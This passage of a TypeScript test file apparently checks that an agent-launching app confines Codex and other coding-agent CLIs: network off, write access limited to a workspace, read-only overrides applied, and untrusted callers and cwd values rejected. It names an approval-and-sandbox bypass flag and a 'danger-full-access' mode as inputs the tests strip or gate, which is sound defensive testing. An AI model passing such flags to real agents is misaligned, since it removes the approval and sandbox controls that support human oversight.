        config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
          ?.filesystem?.[protectedAgentsPath],
      ).toBe("deny");
      expect(spec.env.HOME).toBe(
        path.join(spec.env.CODEX_HOME!, "shell-home"),
      );
      expect(spec.env.TMPDIR).toBe(
        path.join(spec.env.CODEX_HOME!, "shell-tmp"),
      );
      expect(governedCodexArgv(spec)).not.toContain(root);
      expect(governedCodexArgv(spec)).not.toContain(
        "--dangerously-bypass-approvals-and-sandbox",
      );
      expect(governedCodexPermissionProfile(spec)).toBe(
        "nexus_governed_workspace",
      );
    } finally {
      cleanupHook();
      adapterTrust.builtinIds.add("codex");
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("makes read-only override the configured Codex bypass", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const codex = makeCodexAdapter();
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const worker = revisionBoundWorker();
    const reviewer: BoundSpawnAuthority = {
      ...worker,
      context: {
        ...worker.context!,
        readOnly: true,
      },
    };

    adapterTrust.builtinIds.delete("codex");
    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          codex,
          { extraArgs: ["--dangerously-bypass-approvals-and-sandbox"] },
          reviewer,
        ),
      ).toThrow(/trusted builtin/i);
    } finally {
      adapterTrust.builtinIds.add("codex");
    }

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        { extraArgs: ["--dangerously-bypass-approvals-and-sandbox"] },
        reviewer,
      );

      const spec = h.specFor(spawned.sessionId);
      const args = governedCodexArgv(spec);
      if (process.platform === "darwin") {
        expectDarwinCodexOuterSandbox(spec);
      }
      expect(args).not.toContain(
        "--dangerously-bypass-approvals-and-sandbox",
      );
      expect(args).toContain(
        process.platform === "darwin" ? "on-request" : "never",
      );
      if (process.platform !== "darwin") {
        expect(args).not.toContain("--sandbox");
      }
      expect(governedCodexPermissionProfile(spec)).toBe(
        "nexus_governed_read_only",
      );
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")(
    "confines the exact immediate Pet maker to an offline writable workspace",
    () => {
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pet-native-"));
      const workspace = path.join(root, "workspace");
      const runtime = path.join(root, "runtime");
      fs.mkdirSync(workspace, { recursive: true });
      const cleanupHook = installGovernedCodexTestHook(runtime);
      const h = fakeHost();
      setPtyHost(h.host);
      const owner = fakeWc();
      let sessionId: string | null = null;

      try {
        const spawned = spawnAgentSession(
          owner,
          {
            kind: "cli-agent",
            paneId: "pane-pet-maker",
            cols: 80,
            rows: 24,
          },
          makeCodexAdapter(),
          {},
          petStudioGrant(fs.realpathSync(workspace)),
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(spawned.sessionId);
        const config = parse(
          fs.readFileSync(
            path.join(spec.env.CODEX_HOME!, "config.toml"),
            "utf8",
          ),
        ) as {
          default_permissions?: string;
          features?: { network_proxy?: boolean };
          permissions?: Record<
            string,
            {
              filesystem?: Record<string, string>;
              network?: { enabled?: boolean };
            }
          >;
        };
        const workspaceReal = fs.realpathSync(workspace);

        expectDarwinCodexOuterSandbox(spec);
        expect(spec.env.HOME).toBe(
          path.join(spec.env.CODEX_HOME!, "shell-home"),
        );
        expect(spec.env.TMPDIR).toBe(
          path.join(spec.env.CODEX_HOME!, "shell-tmp"),
        );
        expect(config.default_permissions).toBe(
          CODEX_WORKSPACE_PERMISSION_PROFILE,
        );
        expect(config.features?.network_proxy).toBe(false);
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]?.network,
        ).toEqual({ enabled: false });
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
            ?.filesystem,
        ).toEqual(
          expect.objectContaining({
            [workspaceReal]: "write",
            [path.join(workspaceReal, ".agents")]: "deny",
            [path.join(workspaceReal, ".codex")]: "deny",
          }),
        );
        expect(getOwnedAgentSessionInfo(owner, spawned.sessionId)).toMatchObject(
          {
            source: "legacy-squad",
            role: "orchestrator",
            squadId: PET_STUDIO_SQUAD_ID,
            nativeReadOnly: false,
          },
        );
      } finally {
        if (sessionId) orchKillSession(sessionId);
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it.runIf(process.platform === "darwin")(
    "restores an exact persisted Pet maker to the same offline workspace profile",
    () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-pet-resume-native-"),
      );
      const workspace = path.join(root, "workspace");
      const runtime = path.join(root, "runtime");
      fs.mkdirSync(workspace, { recursive: true });
      const cleanupHook = installGovernedCodexTestHook(runtime);
      const providerSessionId = "019d1000-0000-7000-8000-000000000002";
      seedCodexResumeState(runtime, providerSessionId);
      const h = fakeHost();
      setPtyHost(h.host);
      setResumeSessionLookup(() => providerSessionId);
      let sessionId: string | null = null;

      try {
        const spawned = spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-pet-resume",
            resume: true,
            resumeLatestOnly: false,
            cols: 80,
            rows: 24,
          },
          makeCodexAdapter(),
          {},
          persistedPetStudioGrant(fs.realpathSync(workspace)),
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(spawned.sessionId);
        const config = parse(
          fs.readFileSync(
            path.join(spec.env.CODEX_HOME!, "config.toml"),
            "utf8",
          ),
        ) as {
          default_permissions?: string;
          features?: { network_proxy?: boolean };
          permissions?: Record<
            string,
            {
              filesystem?: Record<string, string>;
              network?: { enabled?: boolean };
            }
          >;
        };
        const workspaceReal = fs.realpathSync(workspace);

        expect(spawned.resumeMode).toBe("exact");
        expectDarwinCodexOuterSandbox(spec);
        expect(governedCodexArgv(spec)).toEqual(
          expect.arrayContaining(["resume", providerSessionId]),
        );
        expect(config.default_permissions).toBe(
          CODEX_WORKSPACE_PERMISSION_PROFILE,
        );
        expect(config.features?.network_proxy).toBe(false);
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]?.network,
        ).toEqual({ enabled: false });
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
            ?.filesystem,
        ).toEqual(
          expect.objectContaining({
            [workspaceReal]: "write",
            [path.join(workspaceReal, ".agents")]: "deny",
            [path.join(workspaceReal, ".codex")]: "deny",
          }),
        );
      } finally {
        if (sessionId) orchKillSession(sessionId);
        setResumeSessionLookup(null);
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("rejects a persisted Pet resume whose main-owned pane seal is absent", () => {
    const root = fs.mkdtempSync(
      path.join(os.tmpdir(), "nexus-pet-resume-stale-"),
    );
    const workspace = path.join(root, "workspace");
    const runtime = path.join(root, "runtime");
    fs.mkdirSync(workspace, { recursive: true });
    const cleanupHook = installGovernedCodexTestHook(runtime);
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    setResumeSessionLookup(() => "pet-provider-session");
    const authority = persistedPetStudioGrant(
      fs.realpathSync(workspace),
    );

    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-pet-stale",
            resume: true,
            resumeLatestOnly: false,
            cols: 80,
            rows: 24,
          },
          makeCodexAdapter(),
          {},
          {
            ...authority,
            context: {
              ...authority.context!,
              authoritySeal: undefined,
            },
          },
        ),
      ).toThrow(/persisted Pet Studio resume.*pane seal/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      setResumeSessionLookup(null);
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")(
    "gives a pre-PREVC null/null Codex mission worker a private offline sandbox",
    () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-prevc-native-"),
      );
      const worker = path.join(root, "worker");
      const runtime = path.join(root, "runtime");
      fs.mkdirSync(worker, { recursive: true });
      const cleanupHook = installGovernedCodexTestHook(runtime);
      const h = fakeHost();
      setPtyHost(h.host);
      let sessionId: string | null = null;

      try {
        const authority = preRevisionMissionWorker(
          fs.realpathSync(worker),
        );
        const spawned = spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-before-prevc",
            cols: 80,
            rows: 24,
          },
          makeCodexAdapter(),
          {},
          authority,
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(spawned.sessionId);
        const config = parse(
          fs.readFileSync(
            path.join(spec.env.CODEX_HOME!, "config.toml"),
            "utf8",
          ),
        ) as {
          default_permissions?: string;
          features?: { network_proxy?: boolean };
          permissions?: Record<
            string,
            {
              filesystem?: Record<string, string>;
              network?: { enabled?: boolean };
            }
          >;
        };
        const workerReal = fs.realpathSync(worker);

        expectDarwinCodexOuterSandbox(spec);
        expect(spec.env.CODEX_HOME).toContain(
          `${path.sep}.nexus${path.sep}ephemeral${path.sep}mcp-clients`,
        );
        expect(config.default_permissions).toBe(
          CODEX_WORKSPACE_PERMISSION_PROFILE,
        );
        expect(config.features?.network_proxy).toBe(false);
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]?.network,
        ).toEqual({ enabled: false });
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
            ?.filesystem,
        ).toEqual(
          expect.objectContaining({
            [workerReal]: "write",
            [path.join(workerReal, ".agents")]: "deny",
            [path.join(workerReal, ".codex")]: "deny",
          }),
        );
        expect(governedCodexArgv(spec)).toEqual(
          expect.arrayContaining([
            "--ask-for-approval",
            "on-request",
            "--sandbox",
            "danger-full-access",
          ]),
        );
      } finally {
        if (sessionId) orchKillSession(sessionId);
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("fails a pre-PREVC writable mission worker closed on the coordination checkout", () => {
    const root = fs.mkdtempSync(
      path.join(os.tmpdir(), "nexus-prevc-same-root-"),
    );
    const cleanupHook = installGovernedCodexTestHook(
      path.join(root, "runtime"),
    );
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    const authority = preRevisionMissionWorker(fs.realpathSync(root));

    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          { ...authority, coordinationScope: authority.scope },
        ),
      ).toThrow(/physically distinct execution worktree/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")(
    "keeps every non-Pet immediate Codex orchestrator read-only",
    () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-legacy-readonly-"),
      );
      const workspace = path.join(root, "workspace");
      const runtime = path.join(root, "runtime");
      fs.mkdirSync(workspace, { recursive: true });
      const cleanupHook = installGovernedCodexTestHook(runtime);
      const h = fakeHost();
      setPtyHost(h.host);
      let sessionId: string | null = null;

      try {
        const spawned = spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          missionGrant(fs.realpathSync(workspace)),
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(spawned.sessionId);
        const config = parse(
          fs.readFileSync(
            path.join(spec.env.CODEX_HOME!, "config.toml"),
            "utf8",
          ),
        ) as {
          default_permissions?: string;
          features?: { network_proxy?: boolean };
          permissions?: Record<
            string,
            {
              filesystem?: Record<string, string>;
              network?: { enabled?: boolean };
            }
          >;
        };
        const workspaceReal = fs.realpathSync(workspace);

        expect(config.default_permissions).toBe("nexus_governed_read_only");
        expect(config.features?.network_proxy).toBe(false);
        expect(
          config.permissions?.nexus_governed_read_only?.network,
        ).toEqual({ enabled: false });
        expect(
          config.permissions?.nexus_governed_read_only?.filesystem?.[
            workspaceReal
          ],
        ).toBe("read");
        expect(spec.args[1]).not.toContain(
          `(allow file-write* (subpath ${JSON.stringify(workspaceReal)})`,
        );
      } finally {
        if (sessionId) orchKillSession(sessionId);
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("keeps an approved pre-freeze Codex orchestrator read-only without provider prompts", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const codex = makeCodexAdapter();
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const baseAuthority = trustedSpawn();
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      source: "pending",
      context: {
        missionId: "mission-orchestrator",
        role: "orchestrator",
        readOnly: false,
        nativeReadOnly: true,
        scope: baseAuthority.scope,
        executionScope: baseAuthority.scope,
      },
    };

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        {},
        authority,
      );

      const spec = h.specFor(spawned.sessionId);
      const args = governedCodexArgv(spec);
      if (process.platform === "darwin") {
        expectDarwinCodexOuterSandbox(spec);
        expect(args).toEqual(
          expect.arrayContaining(["--ask-for-approval", "on-request"]),
        );
      } else {
        expect(args).toEqual(
          expect.arrayContaining(["--ask-for-approval", "never"]),
        );
        expect(args).not.toContain("--sandbox");
      }
      expect(args).not.toContain(
        "--dangerously-bypass-approvals-and-sandbox",
      );
      expect(governedCodexPermissionProfile(spec)).toBe(
        "nexus_governed_read_only",
      );
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("reports every scoped agent session even when the provider chooses its id", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const hook = vi.fn();
    setSessionDictationHook(hook);
    const owner = fakeWc();
    const authority = trustedSpawn();
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24, paneId: "pane-a" },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    expect(hook).toHaveBeenCalledWith({
      providerSessionId: null,
      ptySessionId: sessionId,
      adapterId: "test-cli",
      cwd: authority.cwd,
      paneId: "pane-a",
    });
    setSessionDictationHook(null);
    orchKillSession(sessionId);
  });

  it("appends adapter-declared extra args after user overrides", () => {
    const h = fakeHost();
    setPtyHost(h.host);

    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      { extraArgs: ["--disallowedTools", "Task"] },
    );

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      adapter,
      { extraArgs: ["--user-flag"] },
      trustedSpawn(),
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).toContain("--user-flag");
    expect(spec.args).toEqual(
      expect.arrayContaining([
        "--disallowedTools",
        "Task",
        "--sandbox",
        "read-only",
      ]),
    );
  });

  it("lets Kimi transient-model env choose the API model without an overriding --model", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "kimi",
      bin: "kimi",
      spawn: { ...base.spawn, interactive: ["kimi"] },
      models: {
        flag: "--model",
        list: ["kimi-code/kimi-for-coding"],
        default: "kimi-code/kimi-for-coding",
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "kimi",
        model: "kimi-code/kimi-for-coding",
        cols: 80,
        rows: 24,
      },
      adapter,
      {
        keyEnv: {
          KIMI_MODEL_API_KEY: "sk-kimi-test",
          KIMI_MODEL_NAME: "kimi-for-coding",
        },
      },
      trustedSpawn(),
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).not.toContain("--model");
    expect(spec.env.KIMI_MODEL_API_KEY).toBe("sk-kimi-test");
    expect(spec.env.KIMI_MODEL_NAME).toBe("kimi-for-coding");
  });

  it("normalizes the legacy Kimi OAuth model alias before adding --model", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "kimi",
      bin: "kimi",
      spawn: { ...base.spawn, interactive: ["kimi"] },
      models: {
        flag: "--model",
        list: ["kimi-code/kimi-for-coding"],
        default: "kimi-code/kimi-for-coding",
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "kimi",
        model: "kimi-for-coding",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );

    expect(h.specFor(sessionId).args).toEqual([
      "--model",
      "kimi-code/kimi-for-coding",
      "--sandbox",
      "read-only",
    ]);
  });

  it("passes only provider-qualified OpenCode model ids", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "opencode",
      bin: "opencode",
      spawn: { ...base.spawn, interactive: ["opencode"] },
      models: {
        flag: "--model",
        list: ["opencode/big-pickle"],
        default: "opencode/big-pickle",
      },
    };

    const valid = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "opencode",
        model: "opencode/big-pickle",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );
    const stale = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "opencode",
        model: "claude-sonnet-5",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );

    expect(h.specFor(valid.sessionId).args).toEqual([
      "--model",
      "opencode/big-pickle",
      "--sandbox",
      "read-only",
    ]);
    expect(h.specFor(stale.sessionId).args).toEqual(["--sandbox", "read-only"]);
  });

  it("requires a trusted main-side binding and never falls back to HOME", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    expect(() =>
      spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        {},
        undefined as never,
      ),
    ).toThrow(/trusted spawn authority/);
  });

  it("uses the canonical bound cwd even when the renderer request carries another cwd", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const trustedCwd = fs.realpathSync(process.cwd());

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        cwd: "/renderer-controlled/path",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(trustedCwd),
    );

    expect(h.specFor(sessionId).cwd).toBe(trustedCwd);
  });

  it("owns agent metadata in main and consumes mission promotion exactly once", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const baseAdapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...baseAdapter,
      quirks: { ...baseAdapter.quirks, mcpAutoload: true },
    };

    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-orchestrator",
        model: "default",
        accountId: "account-a",
        effort: "high",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    expect(getOwnedAgentSessionInfo(attacker, sessionId)).toBeNull();
    expect(getOwnedAgentSessionInfo(owner, sessionId)).toMatchObject({
      sessionId,
      paneId: "pane-orchestrator",
      adapterId: "test-cli",
      model: "default",
      accountId: "account-a",
      effort: "high",
      cwd,
      role: "orchestrator",
      squadId: "review-squad",
      source: "legacy-squad",
    });
    expect(
      consumeMissionOrchestratorGrant(attacker, sessionId, "review-squad"),
    ).toBeNull();
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "other-squad"),
    ).toBeNull();
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toMatchObject({ sessionId, squadId: "review-squad" });
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toBeNull();
    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-a")).toBe(
      true,
    );
    expect(getOwnedAgentSessionInfo(owner, sessionId)?.missionId).toBe(
      "mission-a",
    );
    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-b")).toBe(
      false,
    );

    orchKillSession(sessionId);
  });

  it("expires an unconsumed mission orchestrator promotion grant", () => {
    vi.useFakeTimers();
    vi.setSystemTime(1_000);
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const baseAdapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...baseAdapter,
      quirks: { ...baseAdapter.quirks, mcpAutoload: true },
    };
    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-expired-orchestrator",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    vi.setSystemTime(10 * 60_000);
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toBeNull();

    orchKillSession(sessionId);
    vi.useRealTimers();
  });

  it("physically terminates an abandoned immediate orchestrator when promotion expires", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: true,
        rootExited: true,
        descendantsExited: true,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const owner = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-abandoned-orchestrator",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    await vi.advanceTimersByTimeAsync(120_000);
    expect(proc.terminate).toHaveBeenCalledWith({
      termTimeoutMs: 1_500,
      killTimeoutMs: 1_500,
    });
    expect(getSessionState(sessionId)).not.toBeNull();
    expect(orchWriteSession(sessionId, "late\r")).toBe(false);

    (handlers as PtySessionHandlers | null)?.onExit(0, 15);
    await vi.advanceTimersByTimeAsync(0);
    expect(getSessionState(sessionId)).toBeNull();
    vi.useRealTimers();
  });

  it("keeps state as busy when hookState is busy, ignoring the idle timeout", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const owner = fakeWc();
    const trusted = trustedSpawn();
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trusted,
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");

    // Initial state is spawning, transitions to busy on first data
    activeHandlers.onData("hello");
    expect(getSessionState(sessionId)).toBe("busy");

    // Publish hook state as busy
    publishSessionActivityState(sessionId, "busy");
    expect(getSessionState(sessionId)).toBe("busy");

    // Advance time by the idle timeout (adapter has 500ms)
    await vi.advanceTimersByTimeAsync(1000);

    // The state should still be busy, because hookState is busy!
    expect(getSessionState(sessionId)).toBe("busy");

    // Publish hook state as idle
    publishSessionActivityState(sessionId, "idle");
    expect(getSessionState(sessionId)).toBe("idle");

    killSession(owner, sessionId);
    vi.useRealTimers();
  });

  it("does not re-emit stateChange when hook re-asserts the same state", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      trustedSpawn(),
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");
    activeHandlers.onData("hello");
    expect(getSessionState(sessionId)).toBe("busy");

    send.mockClear();
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);
    const stateSends = send.mock.calls.filter(
      (call) => call[0] === "pty:stateChange",
    );
    expect(stateSends).toHaveLength(0);

    killSession(owner, sessionId);
  });

  it("supports passive orchestration writes whose busy proof comes from PTY output", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const owner = fakeWc();
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      trustedSpawn(),
    );
    publishSessionActivityState(sessionId, "idle");

    expect(
      orchWriteSession(sessionId, "kickoff\r", { markInputBusy: false }),
    ).toBe(true);
    expect(getSessionState(sessionId)).toBe("idle");
    (handlers as PtySessionHandlers | null)?.onData("accepted");
    expect(getSessionState(sessionId)).toBe("busy");

    killSession(owner, sessionId);
  });

  it("releases a stale hook busy after the watchdog window when no idle arrives", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const owner = fakeWc();
    const trusted = trustedSpawn();
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24 },
      adapter,
      {},
      trusted,
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");

    activeHandlers.onData("hello");
    publishSessionActivityState(sessionId, "busy");

    // The idle timeout passes but the hook still says busy → stays busy.
    await vi.advanceTimersByTimeAsync(1000);
    expect(getSessionState(sessionId)).toBe("busy");

    // No idle hook ever arrives (agent killed / Stop hook lost). Past the
    // watchdog window the stuck busy is released so the quiet session settles.
    await vi.advanceTimersByTimeAsync(6 * 60_000);
    expect(getSessionState(sessionId)).toBe("idle");

    killSession(owner, sessionId);
    vi.useRealTimers();
  });
});
